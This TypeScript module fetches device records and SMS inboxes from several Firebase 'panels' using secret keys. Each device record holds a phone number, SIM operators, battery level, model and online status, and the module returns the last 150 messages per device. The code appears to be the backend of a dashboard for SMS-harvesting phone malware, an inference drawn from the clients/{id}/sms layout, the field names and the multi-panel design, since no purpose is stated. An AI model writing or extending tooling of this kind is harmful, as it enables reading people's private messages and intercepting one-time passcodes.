import { logger } from "./logger";

export interface FirebaseDevice {
  id: string;
  name: string;
  status: boolean;
  phoneNumber: string;
  battery: string;
  model: string;
  lastSeen: string | null;
  simCount: number;
  totalSms: number;
  panelId: number;
  panelName: string;
  sims: FirebaseSim[];
}

export interface FirebaseSim {
  phoneNumber: string;
  operator: string;
}

export interface FirebaseSmsMessage {
  text: string;
  sender: string;
  time: string;
}

async function firebaseFetch(
  firebaseUrl: string,
  secretKey: string,
  path: string
): Promise<unknown> {
  const base = firebaseUrl.trim().replace(/\/$/, "");
  const url = `${base}/${path}.json?auth=${secretKey.trim()}`;
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 15000);
  try {
    const res = await fetch(url, {
      headers: { Accept: "application/json" },
      signal: ctrl.signal,
    });
    clearTimeout(timer);
    if (!res.ok) {
      if (res.status === 401 || res.status === 403) {
        throw new Error("PERMISSION_DENIED: Firebase rejected the key.");
      }
      if (res.status === 404) return null;
      throw new Error(`HTTP ${res.status}`);
    }
    return res.json();
  } catch (err) {
    clearTimeout(timer);
    if ((err as Error).name === "AbortError") {
      throw new Error("Request timed out.");
    }
    throw err;
  }
}

function parseDevices(
  data: unknown,
  panelId: number,
  panelName: string
): FirebaseDevice[] {
  if (!data || typeof data !== "object") return [];
  const entries = Object.entries(data as Record<string, unknown>);
  const devices: FirebaseDevice[] = [];

  for (const [id, raw] of entries) {
    if (!raw || typeof raw !== "object") continue;
    const d = raw as Record<string, unknown>;

    // Parse SIMs
    const simsRaw = d.sims || d.simDetails;
    const sims: FirebaseSim[] = [];
    if (Array.isArray(simsRaw)) {
      for (const s of simsRaw) {
        if (s && typeof s === "object") {
          sims.push({
            phoneNumber: String((s as Record<string, unknown>).phoneNumber || ""),
            operator: String((s as Record<string, unknown>).operator || (s as Record<string, unknown>).service_provider || ""),
          });
        }
      }
    }

    // Get primary phone number
    const phoneNumber =
      String(d.mobNo || d.phoneNumber || sims[0]?.phoneNumber || "—");

    // Parse battery
    const batteryRaw = d.battery || d.batteryPercent || d.batteryLevel;
    const battery = batteryRaw !== undefined ? `${batteryRaw}%` : "—";

    // Parse model
    const model = String(d.model || d.device || d.deviceModel || "—");

    // Parse last seen
    const lastSeenRaw = d.lastSeen || d.last_seen || d.timestamp;
    const lastSeen = lastSeenRaw ? String(lastSeenRaw) : null;

    // Count SMS
    const smsRaw = d.sms || d.messages || d.inbox;
    const totalSms = smsRaw && typeof smsRaw === "object"
      ? Object.keys(smsRaw).length
      : 0;

    // Online status
    const status = Boolean(d.status || d.online);

    // Name
    const name = String(d.name || d.deviceName || id);

    devices.push({
      id,
      name,
      status,
      phoneNumber,
      battery,
      model,
      lastSeen,
      simCount: sims.length || 1,
      totalSms,
      panelId,
      panelName,
      sims,
    });
  }

  return devices;
}

export async function fetchPanelDevices(
  firebaseUrl: string,
  secretKey: string,
  panelId: number,
  panelName: string
): Promise<FirebaseDevice[]> {
  try {
    const data = await firebaseFetch(firebaseUrl, secretKey, "clients");
    return parseDevices(data, panelId, panelName);
  } catch (err) {
    logger.error({ err, panelId }, "Failed to fetch panel devices");
    return [];
  }
}

export async function fetchDeviceSms(
  firebaseUrl: string,
  secretKey: string,
  deviceId: string
): Promise<FirebaseSmsMessage[]> {
  try {
    const data = await firebaseFetch(
      firebaseUrl,
      secretKey,
      `clients/${deviceId}/sms`
    );
    if (!data || typeof data !== "object") return [];
    const entries = Object.entries(data as Record<string, unknown>);
    // Take last 150 entries
    const slice = entries.length > 150 ? entries.slice(entries.length - 150) : entries;
    const messages: FirebaseSmsMessage[] = [];
    for (const [, raw] of slice) {
      if (!raw || typeof raw !== "object") continue;
      const m = raw as Record<string, unknown>;
      const text = String(m.message || m.body || m.text || "");
      if (!text.trim()) continue;
      messages.push({
        text,
        sender: String(m.sender || m.from || "Unknown"),
        time: String(m.dateTime || m.date || ""),
      });
    }
    return messages.reverse();
  } catch (err) {
    logger.error({ err, deviceId }, "Failed to fetch device SMS");
    return [];
  }
}
